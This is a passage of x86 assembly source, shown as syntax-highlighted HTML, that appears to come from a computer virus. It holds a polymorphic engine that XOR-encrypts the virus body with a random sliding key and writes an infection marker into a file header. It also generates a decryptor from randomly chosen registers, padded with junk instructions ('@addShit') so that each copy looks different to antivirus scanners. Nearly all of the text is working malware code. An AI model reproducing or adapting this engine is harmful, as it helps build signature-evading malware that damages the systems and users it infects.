          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc4">],</span><span class="sc12">'TM'</span><span class="sc0">          </span><span class="sc1">;yesssssss, it's stupid</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_hSize</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_vSize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_hSize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
 
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorAdd</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorConst</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@nextDD2copy</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">stosd</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@nextDD2copy</span><span class="sc0">

          </span><span class="sc6">ret</span><span class="sc0">         

</span><span class="sc1">;--------------------------------------( random )-------------------------</span><span class="sc0">
</span><span class="sc5">@random</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;CF-&gt;1 - byte</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">pushf</span><span class="sc0">
          </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">          
          </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">        </span><span class="sc1">;we'll fit everywhere</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc5">@delay</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@delay</span><span class="sc0">
          </span><span class="sc6">popf</span><span class="sc0">
          </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@hops</span><span class="sc0">    
          </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">
</span><span class="sc5">@hops</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------( set header )----------------</span><span class="sc0">
</span><span class="sc5">_regSet</span><span class="sc0">             </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">;xor offset</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">;xor const</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">;xor add</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">;xor size</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">;1st. usefull reg</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">;2nd. usefull reg</span><span class="sc0">

</span><span class="sc5">_xorOffs</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;xor offset</span><span class="sc0">
</span><span class="sc5">_xorConst</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;xor constant</span><span class="sc0">
</span><span class="sc5">_xorAdd</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;xor adding</span><span class="sc0">
</span><span class="sc5">_xorSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">_vSize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">;xored size</span><span class="sc0">
</span><span class="sc5">_xorNext</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">@setHeader</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pusha</span><span class="sc0">
          
          </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorConst</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc4">],</span><span class="sc2">0ffffffffh</span><span class="sc0">          </span><span class="sc1">;;)</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;set registers we'll use</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
          
</span><span class="sc5">@nextReg</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">clc</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@random</span><span class="sc0">

          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;esp</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@nextReg</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">;ebp</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@nextReg</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
          </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@nextReg</span><span class="sc0">
          
          </span><span class="sc6">stosb</span><span class="sc0">
          
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">          
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@nextReg</span><span class="sc0">

          </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorAdd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@start</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorOffs</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">@nextMOVie</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">
          </span><span class="sc6">stosd</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">
          </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@nextMOVie</span><span class="sc0">         
          
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------( set xor instruction )-----</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorNext</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">          
          </span><span class="sc6">stosb</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------( set add instruction )------</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------( set 2nd add instruction )--</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------( set dec instruction )------</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------( set jnz instruction )------</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@hmmm</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@oneByte</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0850fh</span><span class="sc0">
          </span><span class="sc6">stosw</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorNext</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">stosd</span><span class="sc0">                         </span><span class="sc1">;set 6 bytes jnz</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@whoops</span><span class="sc0">
          
</span><span class="sc5">@oneByte</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc0">         
          </span><span class="sc6">stosb</span><span class="sc0">                         
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xorNext</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">;set 2 bytes jnz</span><span class="sc0">

</span><span class="sc5">@whoops</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;-----------------------( set last bytes stuff...)----------</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@bleh</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@nextStuff</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@addShit</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@nextStuff</span><span class="sc0">

</span><span class="sc5">@end</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@final</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">@nextB</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">clc</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@random</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_1BytesShit</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@nextB</span><span class="sc0">

</span><span class="sc5">@final</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">popa</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_1BytesShit</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
          </span><span class="sc6">clc</span><span class="sc0">
          </span><span class="sc6">cmc</span><span class="sc0">
          </span><span class="sc6">stc</span><span class="sc0">
          </span><span class="sc6">std</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">cli</span><span class="sc0">
          </span><span class="sc6">sti</span><span class="sc0">
          </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc1">;-------------------------------( add shit instruction )----</span><span class="sc0">
</span><span class="sc5">_2BytesShit</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc0">        </span><span class="sc1">;xor r32,r32</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">087h</span><span class="sc0">        </span><span class="sc1">;xchg r32,r32</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">013h</span><span class="sc0">        </span><span class="sc1">;adc r32,r32</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02bh</span><span class="sc0">        </span><span class="sc1">;sub r32,r32</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">019h</span><span class="sc0">        </span><span class="sc1">;sbb r32,r32</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">09h</span><span class="sc0">        </span><span class="sc1">;or r32,r32</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08bh</span><span class="sc0">        </span><span class="sc1">;mov r32,r32</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">        </span><span class="sc1">;add r32,r32</span><span class="sc0">

</span><span class="sc5">_lastShit</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">

</span><span class="sc1">;---------------------------( add some code )---------------</span><span class="sc0">
</span><span class="sc5">@addShit</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@hmmm</span><span class="sc0">          </span><span class="sc1">;compare 2 and 3 bytes instructions</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@3bytes</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@hmmm</span><span class="sc0">          </span><span class="sc1">;no instruction will b add</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@noShit</span><span class="sc0">

</span><span class="sc5">@nextShit</span><span class="sc4">:</span><span class="sc0">                    
          </span><span class="sc6">clc</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@random</span><span class="sc0">
          
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_2BytesShit</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;set instruction</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_lastShit</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@nextShit</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_lastShit</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_regSet</span><span class="sc4">]</span><span class="sc0">
       
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">      </span><span class="sc1">;edi - di - ...where's the 8 bit version?</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@hmmm</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noDEC</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          
</span><span class="sc5">@noDEC</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

